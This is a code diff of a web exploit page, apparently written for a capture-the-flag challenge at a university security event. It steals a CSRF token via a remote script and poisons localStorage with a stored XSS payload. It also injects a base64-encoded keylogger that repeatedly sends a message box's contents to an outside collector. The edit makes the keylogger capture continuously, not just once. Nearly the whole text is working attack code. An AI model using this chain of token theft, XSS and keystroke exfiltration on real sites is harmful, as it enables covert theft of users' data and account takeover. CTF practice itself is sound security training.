@@ -5,7 +5,6 @@
     <meta name="referrer" content="no-referrer">
 </head>
 <body>
-    <!-- THE MISSING PIECE: We MUST have a form for the script to target! -->
     <form id="csrf_target_form"></form>
 
     <script>
@@ -13,7 +12,6 @@
         new Image().src = W + "/?step=1_github_started";
     </script>
 
-    <!-- Steal the CSRF Token -->
     <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js"></script>
 
     <script>
@@ -37,26 +35,24 @@
             function executePayload(token) {
                 new Image().src = W + "/?step=2_token_grabbed";
 
-                // THE KEYLOGGER:
-                // Runs every 100ms. If it sees text in the message box, it exfiltrates it.
+                // THE CONTINUOUS KEYLOGGER:
+                // If the text box has content AND it's different from the last time we checked, send it!
                 var keylogger = 
                     "setInterval(function(){" +
                     "  var m = document.getElementById('message');" +
-                    "  if(m && m.value.length > 5 && !window.flagSent){" +
+                    "  if(m && m.value.length > 0 && m.value !== window.lastCaptured){" +
                     "    new Image().src='" + W + "/?flag='+encodeURIComponent(m.value);" +
-                    "    window.flagSent=true;" +
+                    "    window.lastCaptured = m.value;" +
                     "  }" +
-                    "}, 100);";
+                    "}, 200);";
 
                 var encodedKeylogger = btoa(keylogger);
 
-                // THE DIARY XSS (Storage Poisoning):
                 var innerJS = 
                     "document.domain='owley-madison.jeopardy.websec.saarland';" +
                     "var m=document.createElement('iframe');" +
                     "m.src='https://match.owley-madison.jeopardy.websec.saarland/';" +
                     "m.onload=function(){" +
-                        // Inject the Keylogger into the storage
                         "var p = '</option></select><img src=x onerror=\"eval(atob(\\'" + encodedKeylogger + "\\'))\">';" +
                         "m.contentWindow.localStorage.setItem('favorites', JSON.stringify([p]));" +
                         "new Image().src='" + W + "/?step=3_storage_poisoned_waiting_for_bot';" +
@@ -66,7 +62,6 @@
                 var encodedJS = btoa(innerJS);
                 var diaryEntry = '<img src="x" onerror="eval(atob(\'' + encodedJS + '\'))">';
 
-                // SILENT FORM SUBMISSION:
                 var iframe = document.createElement('iframe');
                 iframe.name = 'hidden_frame';
                 iframe.style.display = 'none';
